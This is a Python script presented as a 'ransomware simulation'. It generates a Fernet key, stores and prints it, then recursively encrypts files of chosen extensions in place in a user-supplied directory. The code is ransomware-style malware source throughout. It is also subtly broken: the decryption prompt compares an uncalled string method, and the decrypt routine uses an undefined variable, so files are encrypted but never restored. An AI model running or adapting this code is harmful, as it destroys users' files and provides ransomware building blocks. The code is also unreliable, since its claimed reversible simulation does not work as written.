import os
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("encryption.key","rb").read()

def encrypt_file(file_path, key):
    with open(file_path, "rb") as path:
        path_data = path.read()

    f = Fernet(key)
    encrypted_data = f.encrypt(path_data)

    with open(file_path, "wb") as path:
        path.write(encrypted_data)


def decrypt_file(file_path, key):
    with open(file_path, "rb") as path:
        encrypted_data = path.read()

    f = Fernet(key)
    decrypted_data = f.decrypt(encrypted_data)

    with open(file_path, "wb") as path:
        path.write(decrypted_data)


def encrypt_files_in_directory(directory, file_extensions, key):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(file_extensions)):
                file_path = os.path.join(root, file)
                encrypt_file(file_path,key)
                print(f"Encrypted: {file_path}")


def decrypt_files_in_directory(directory, file_extensions, key):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(extensions)):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)
                print(f"Decrypted: {file_path}")


def ransomware_simulation(directory, file_extensions=[".txt"]):
    key = generate_key()
    print(f"Encryption Key: {key.decode()}")
    print(f"Encrypting files...")

    encrypt_files_in_directory(directory, file_extensions, key)

    decrypt_response = input("Would you like to decrypt the files? (yes/no)")
    if decrypt_response.lower == "yes":
        decrypt_files_in_directory(directory, file_extensions, key)
        print("Files have been decrypted.")

if __name__ == "__main__":
    target_directory = input("Enter the directory to run the ransomware simulation on:")
    ransomware_simulation(target_directory)
